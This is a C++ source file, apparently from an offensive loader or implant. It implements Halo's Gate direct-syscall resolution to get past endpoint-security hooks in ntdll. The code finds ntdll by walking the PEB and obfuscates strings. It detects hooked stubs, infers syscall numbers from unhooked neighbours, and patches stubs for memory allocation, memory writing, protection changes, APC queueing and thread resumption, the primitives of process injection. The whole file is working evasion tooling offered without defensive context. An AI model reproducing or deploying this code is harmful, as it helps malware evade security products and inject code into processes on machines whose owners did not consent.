#include "syscalls.hpp"
#include "handler_util.hpp"
#include "obfuscation.hpp"
#include <cstdint>

#define MAX_NT_EXPORTS 2048

struct ntexport_entry {
    DWORD rva;
    DWORD ordinal;
    bool is_hooked;
    uint32_t ssn;
};

static DWORD_PTR g_ntdll_base = 0;
static ntexport_entry g_export_buffer[MAX_NT_EXPORTS];
static DWORD g_export_count = 0;
static RtlCreateProcessParametersEx_t g_RtlCreateProcessParametersEx = nullptr;

static bool str_equal(const char* a, const char* b) {
    while (*a && *b) {
        if (*a != *b) return false;
        a++;
        b++;
    }
    return *a == *b;
}

static DWORD_PTR find_ntdll_base() {
    PPEB peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
    PPEB_LDR_DATA ldr = peb->Ldr;
    LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY* entry = head->Flink;

    while (entry != head) {
        PLDR_DATA_TABLE_ENTRY1 mod = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY1, InMemoryOrderLinks);
        if (_wcsnicmp(mod->BaseDllName.Buffer, XorStringW(L"ntdll.dll"), mod->BaseDllName.Length / sizeof(wchar_t)) == 0) {
            return reinterpret_cast<DWORD_PTR>(mod->DllBase);
        }
        entry = entry->Flink;
    }
    return 0;
}

static bool is_syscall_stub(const uint8_t* addr) {
    if (addr[0] == 0xE9) return false;
    if (addr[0] == 0xEB) return false;
    if (addr[0] == 0x4C && addr[1] == 0x8B && addr[2] == 0xD1 && addr[3] == 0xB8) return true;
    return false;
}

static uint32_t extract_ssn(const uint8_t* addr) {
    return *reinterpret_cast<const uint32_t*>(addr + 4);
}

static int find_export_index(const char* name) {
    for (DWORD i = 0; i < g_export_count; i++) {
        char* export_name = reinterpret_cast<char*>(g_ntdll_base + g_export_buffer[i].rva);
        if (str_equal(export_name, name)) {
            return static_cast<int>(i);
        }
    }
    return -1;
}

static uint32_t resolve_ssn_halos(int idx) {
    for (int d = 1; d < 100; d++) {
        int up = idx + d;
        if (up < static_cast<int>(g_export_count) && !g_export_buffer[up].is_hooked) {
            return g_export_buffer[up].ssn - static_cast<uint32_t>(g_export_buffer[up].ordinal - g_export_buffer[idx].ordinal);
        }
        int down = idx - d;
        if (down >= 0 && !g_export_buffer[down].is_hooked) {
            return g_export_buffer[down].ssn + static_cast<uint32_t>(g_export_buffer[idx].ordinal - g_export_buffer[down].ordinal);
        }
    }
    return 0xFFFFFFFF;
}

static void patch_stub(uint8_t* stub_addr, uint32_t ssn) {
    DWORD old_protect;
    VirtualProtect(stub_addr, 8, PAGE_EXECUTE_READWRITE, &old_protect);
    *reinterpret_cast<uint32_t*>(stub_addr + 4) = ssn;
    VirtualProtect(stub_addr, 8, old_protect, &old_protect);
}

static DWORD find_export_addr(const char* name, void** out_addr) {
    PIMAGE_DOS_HEADER dos = reinterpret_cast<PIMAGE_DOS_HEADER>(g_ntdll_base);
    PIMAGE_NT_HEADERS nt = reinterpret_cast<PIMAGE_NT_HEADERS>(g_ntdll_base + dos->e_lfanew);
    DWORD export_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD export_size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    PIMAGE_EXPORT_DIRECTORY exp = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(g_ntdll_base + export_rva);
    PDWORD names = reinterpret_cast<PDWORD>(g_ntdll_base + exp->AddressOfNames);
    PWORD ordinals = reinterpret_cast<PWORD>(g_ntdll_base + exp->AddressOfNameOrdinals);
    PDWORD funcs = reinterpret_cast<PDWORD>(g_ntdll_base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char* export_name = reinterpret_cast<char*>(g_ntdll_base + names[i]);
        if (str_equal(export_name, name)) {
            *out_addr = reinterpret_cast<void*>(g_ntdll_base + funcs[ordinals[i]]);
            return ERROR_SUCCESS;
        }
    }
    return FAIL_HALOS_GATE_EXPORT;
}

DWORD InitSyscalls() {
    if (g_ntdll_base != 0) {
        return ERROR_SUCCESS;
    }

    g_ntdll_base = find_ntdll_base();
    if (g_ntdll_base == 0) {
        return FAIL_HALOS_GATE_BASE;
    }

    PIMAGE_DOS_HEADER dos = reinterpret_cast<PIMAGE_DOS_HEADER>(g_ntdll_base);
    PIMAGE_NT_HEADERS nt = reinterpret_cast<PIMAGE_NT_HEADERS>(g_ntdll_base + dos->e_lfanew);
    DWORD export_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD export_size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    PIMAGE_EXPORT_DIRECTORY exp = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(g_ntdll_base + export_rva);
    PDWORD names = reinterpret_cast<PDWORD>(g_ntdll_base + exp->AddressOfNames);
    PWORD ordinals = reinterpret_cast<PWORD>(g_ntdll_base + exp->AddressOfNameOrdinals);
    PDWORD funcs = reinterpret_cast<PDWORD>(g_ntdll_base + exp->AddressOfFunctions);

    DWORD count = exp->NumberOfNames;
    if (count > MAX_NT_EXPORTS) count = MAX_NT_EXPORTS;
    g_export_count = 0;

    for (DWORD i = 0; i < count; i++) {
        char* name = reinterpret_cast<char*>(g_ntdll_base + names[i]);
        bool is_nt = (name[0] == 'N' && name[1] == 't');
        bool is_zw = (name[0] == 'Z' && name[1] == 'w');
        if (!is_nt && !is_zw) continue;

        DWORD rva = funcs[ordinals[i]];
        const uint8_t* stub = reinterpret_cast<const uint8_t*>(g_ntdll_base + rva);

        g_export_buffer[g_export_count].rva = names[i];
        g_export_buffer[g_export_count].ordinal = ordinals[i];

        if (is_syscall_stub(stub)) {
            g_export_buffer[g_export_count].is_hooked = false;
            g_export_buffer[g_export_count].ssn = extract_ssn(stub);
        } else {
            g_export_buffer[g_export_count].is_hooked = true;
            g_export_buffer[g_export_count].ssn = 0xFFFFFFFF;
        }
        g_export_count++;
    }

    const char* target_names[] = {
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtProtectVirtualMemory",
        "NtQueueApcThread",
        "NtResumeThread"
    };
    void* stub_addrs[] = {
        reinterpret_cast<void*>(&SysNtAllocateVirtualMemory),
        reinterpret_cast<void*>(&SysNtWriteVirtualMemory),
        reinterpret_cast<void*>(&SysNtProtectVirtualMemory),
        reinterpret_cast<void*>(&SysNtQueueApcThread),
        reinterpret_cast<void*>(&SysNtResumeThread)
    };

    for (int i = 0; i < 5; i++) {
        int idx = find_export_index(target_names[i]);
        if (idx < 0) return FAIL_HALOS_GATE_EXPORT;

        uint32_t ssn;
        if (!g_export_buffer[idx].is_hooked) {
            ssn = g_export_buffer[idx].ssn;
        } else {
            ssn = resolve_ssn_halos(idx);
            if (ssn == 0xFFFFFFFF) return FAIL_HALOS_GATE_EXPORT;
        }
        patch_stub(reinterpret_cast<uint8_t*>(stub_addrs[i]), ssn);
    }

    DWORD result = find_export_addr("RtlCreateProcessParametersEx",
        reinterpret_cast<void**>(&g_RtlCreateProcessParametersEx));
    if (result != ERROR_SUCCESS) {
        return FAIL_HALOS_GATE_EXPORT;
    }

    return ERROR_SUCCESS;
}

RtlCreateProcessParametersEx_t SysGetRtlCreateProcessParametersEx() {
    return g_RtlCreateProcessParametersEx;
}
